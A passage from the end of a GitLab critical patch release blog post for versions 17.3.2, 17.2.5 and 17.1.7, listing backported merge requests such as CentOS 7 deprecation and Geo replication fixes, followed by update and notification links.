* [Use latest builder images for check-packages pipeline (17.2 Backport)](https://gitlab.com/gitlab-org/omnibus-gitlab/-/merge_requests/7876)
* [[17.2 Backport] Deprecate CentOS 7](https://gitlab.com/gitlab-org/omnibus-gitlab/-/merge_requests/7896)

### 17.1.7

* [Backport "Disable allow\_failure for release-environments pipeline"](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/163191)
* [Backport to 17.1: Fixes Geo Replication Details view](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/162939)
* [Backport OpenSSL v3 callout to 17.1](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/164892)
* [Backport to 17.1: Fix JobArtifactState query timeout](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/165270)
* [CI: Add test basic package functionality before release (17.1 Backport)](https://gitlab.com/gitlab-org/omnibus-gitlab/-/merge_requests/7875)
* [Use latest builder images for check-packages pipeline (17.1 Backport)](https://gitlab.com/gitlab-org/omnibus-gitlab/-/merge_requests/7877)
* [[17.1 Backport] Deprecate CentOS 7](https://gitlab.com/gitlab-org/omnibus-gitlab/-/merge_requests/7897)

## Updating

To update GitLab, see the [Update page](/update).
To update Gitlab Runner, see the [Updating the Runner page](https://docs.gitlab.com/runner/install/linux-repository.html#updating-the-runner).

## Receive Patch Notifications

To receive patch blog notifications delivered to your inbox, visit our [contact us](https://about.gitlab.com/company/contact/) page.
To receive release notifications via RSS, subscribe to our [patch release RSS feed](https://about.gitlab.com/security-releases.xml) or our [RSS feed for all releases](https://about.gitlab.com/all-releases.xml).

## Weâre combining patch and security releases

This improvement in our release process matches the industry standard and will help GitLab users get information about security and
bug fixes sooner, [read the blog post here](https://about.gitlab.com/blog/2024/03/26/were-combining-patch-and-security-releases/).

[GitLab Critical Patch Release: 17.3.2, 17.2.5, 17.1.7
via @gitlab

Click to tweet!](http://twitter.com/share?text=GitLab+Critical+Patch+Release%3A+17.3.2%2C+17.2.5%2C+17.1.7+via+%40gitlab&url=https://about.gitlab.com/releases/2024/09/11/patch-release-gitlab-17-3-2-released/&hashtags= "Tweet!")

* [security](/releases/tags.html#security)

[Share on Facebook](http://www.facebook.com/sharer.php?u=https://about.gitlab.com/releases/2024/09/11/patch-release-gitlab-17-3-2-released/)
[Share on X](http://x.com/share?url=https://about.gitlab.com/releases/2024/09/11/patch-release-gitlab-17-3-2-released/&text=GitLab Critical Patch Release: 17.3.2, 17.2.5, 17.1.7)
[Share on LinkedIn](https://www.linkedin.com/shareArticle?mini=true&url=https://about.gitlab.com/releases/2024/09/11/patch-release-gitlab-17-3-2-released/&title=GitLab Critical Patch Release: 17.3.2, 17.2.5, 17.1.7&summary=&source=)
[Share on Hacker News](https://news.ycombinator.com/submitlink?u=https://about.gitlab.com/releases/2024/09/11/patch-release-gitlab-17-3-2-released/&t=GitLab Critical Patch Release: 17.3.2, 17.2.5, 17.1.7)

* [Previous Post:
  GitLab Patch Release: 17.3.1, 17.2.4, 17.1.6](/releases/2024/08/21/patch-release-gitlab-17-3-1-released/ "GitLab Patch Release: 17.3.1, 17.2.4, 17.1.6")
* [Next Post:
  GitLab Critical Patch Release: 17.3.3, 17.2.7, 17.1.8, 17.0.8,
  ...](/releases/2024/09/17/patch-release-gitlab-17-3-3-released/ "GitLab Critical Patch Release: 17.3.3, 17.2.7, 17.1.8, 17.0.8, 16.11.10")

Sign up for GitLab's monthly newsletter

Thanks for subscribing!

### We want to hear from you

Enjoyed reading this blog post or have questions or feedback? Share your thoughts by creating a new topic in the GitLab community forum.

[Share your feedback](https://forum.gitlab.com/new-topic?title=GitLab Critical Patch Release: 17.3.2, 17.2.5, 17.1.7&body=&tags=blog-feedback)

## Take GitLab for a spin

See what your team could do with The DevSecOps Platform.

[Get free trial](https://gitlab.com/-/trials/new?glm_content=default-saas-trial&glm_source=about.gitlab.com)

![](/images/cta/gitlab-enterprise-team-member-photos.png)

Have a question? We're here to help.

[Talk to an expert](https://about.gitlab.com/sales/)

[Edit this page](https://gitlab.com/-/ide/project/gitlab-com/www-gitlab-com/edit/master/-/sites/uncategorized/source/releases/posts/2024-09-11-patch-release-gitlab-17-3-2-released.html.md)
[View source](https://gitlab.com/gitlab-com/www-gitlab-com/blob/master/sites/uncategorized/source/releases/posts/2024-09-11-patch-release-gitlab-17-3-2-released.html.md)


